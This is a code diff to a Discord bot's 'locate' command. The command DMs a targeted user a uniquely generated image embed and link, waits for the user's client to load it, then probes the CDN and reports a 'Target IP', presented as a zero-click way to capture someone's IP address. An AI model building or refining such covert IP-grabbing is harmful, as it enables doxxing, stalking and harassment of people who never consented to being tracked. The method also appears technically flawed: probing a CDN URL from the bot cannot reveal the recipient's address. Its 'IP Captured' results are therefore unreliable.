@@ -6,8 +6,9 @@ import random
 import string
 from http.server import HTTPServer, SimpleHTTPRequestHandler
 import threading
-import time
 import asyncio
+from io import BytesIO
+from PIL import Image, ImageDraw, ImageFont
 
 # Get token from Railway env vars
 TOKEN = os.getenv('DISCORD_TOKEN')
@@ -57,14 +58,45 @@ async def on_guild_join(guild):
         except Exception as e:
             print(f"Failed to leave {guild.name}: {e}")
 
+def generate_unique_image(random_id):
+    """Generates a unique image using Pillow to ensure no caching."""
+    # Create a white image
+    img = Image.new('RGB', (400, 400), color=(255, 255, 255))
+    d = ImageDraw.Draw(img)
+    
+    # Draw a unique pattern/text based on the ID
+    # Using a simple colored square and text to ensure uniqueness
+    d.rectangle([50, 50, 350, 350], fill=None, outline=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)), width=10)
+    
+    # Add the ID text to the center
+    try:
+        font = ImageFont.truetype("arial.ttf", 40)
+    except IOError:
+        font = ImageFont.load_default()
+        
+    text = f"ID: {random_id}"
+    bbox = d.textbbox((0, 0), text, font=font)
+    w = bbox[2] - bbox[0]
+    h = bbox[3] - bbox[1]
+    x = 200 - w / 2
+    y = 200 - h / 2
+    d.text((x, y), text, fill=(0, 0, 0), font=font)
+    
+    # Save to bytes
+    buffer = BytesIO()
+    img.save(buffer, format='PNG')
+    buffer.seek(0)
+    return buffer.getvalue()
+
 @bot.command()
 async def locate(ctx, user: discord.User):
     """
-    Improved 0-Click Method:
-    1. Sets Bot Avatar to unique URL.
-    2. Sends DM with an IMAGE LINK. This forces Discord to generate a preview, 
-       which triggers the image download (and IP log) immediately upon opening the DM.
-    3. Probes for IP.
+    Improved 0-Click Method with Unique Images:
+    1. Generates a UNIQUE image with a random ID.
+    2. Sets Bot Avatar to this unique image.
+    3. Sends DM with an EMBED containing this unique image.
+    4. Forces Discord client to download the NEW image.
+    5. Probes for IP.
     """
     if ctx.guild is None:
         return 
@@ -72,40 +104,43 @@ async def locate(ctx, user: discord.User):
     # 1. Generate unique ID
     random_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
     
-    # Use a direct image URL that passes through Cloudflare
-    img_url = f"https://httpbin.org/image/png?r={random_id}" 
+    # 2. Generate unique image data
+    unique_img_data = generate_unique_image(random_id)
     
-    # 2. Set Avatar
+    # 3. Set Avatar to the unique image
     try:
-        resp = requests.get(img_url)
-        if resp.status_code == 200:
-            await ctx.bot.user.edit(avatar=resp.content)
-            print(f"Avatar set to: {img_url}")
-        else:
-            await ctx.send("Failed to download avatar.")
-            return
+        await ctx.bot.user.edit(avatar=unique_img_data)
+        print(f"Avatar set to unique image with ID: {random_id}")
     except Exception as e:
         await ctx.send(f"Error setting avatar: {e}")
         return
 
-    # 3. Send DM with an IMAGE to force load
-    # Sending an actual image embed ensures the URL is fetched by the client
+    # 4. Upload the image to Discord first to get a stable CDN URL
+    # This avoids issues with raw byte URLs expiring
     try:
-        # Create an embed with the image
+        file = discord.File(fp=BytesIO(unique_img_data), filename=f"{random_id}.png")
         embed = discord.Embed(title="Check this out!", color=discord.Color.blue())
-        embed.set_image(url=img_url)
+        embed.set_image(url=f"attachment://{random_id}.png")
         
-        await user.send(embed=embed)
-        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent image link. Waiting for load...**")
+        # Send the message with the image attached
+        msg = await user.send(embed=embed, file=file)
+        
+        # Also send the raw URL in the DM to ensure it's fetched
+        await user.send(f"Image Link: {msg.attachments[0].url}")
+        
+        await ctx.send(f"👁️ **Target:** {user.name}\n⏳ **Sent unique image. Waiting for load...**")
     except discord.Forbidden:
         await ctx.send(f"Cannot DM {user.name}.")
         return
 
-    # 4. Wait for the client to process the embed and fetch the image
-    # Embed previews usually trigger loads within 5-10 seconds of opening the chat.
+    # 5. Wait for the client to process the embed and fetch the image
+    # Give it enough time for the client to open the DM and render the embed
     await asyncio.sleep(15)
 
-    # 5. Probe for IP using GET to ensure full header response
+    # 6. Probe for IP using the Discord CDN URL of the attachment
+    # This URL is stable and won't expire quickly
+    img_url = msg.attachments[0].url
+    
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
     
     try:
@@ -124,7 +159,7 @@ async def locate(ctx, user: discord.User):
         
         if probe_resp.status_code == 200:
             if cf_status == 'HIT':
-                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT"
+                result_msg = f"✅ **IP Captured!**\n🌐 **Target IP:** `{target_ip}`\n📡 **Cache:** HIT\n🖼️ **Unique ID:** {random_id}"
             elif cf_status == 'MISS':
                 result_msg = f"⚠️ **IP Attempted:** `{target_ip}`\n📡 **Cache:** MISS\n💡 Note: If IP is 'Not Found', the target may have disabled image loading or used a proxy."
             else:
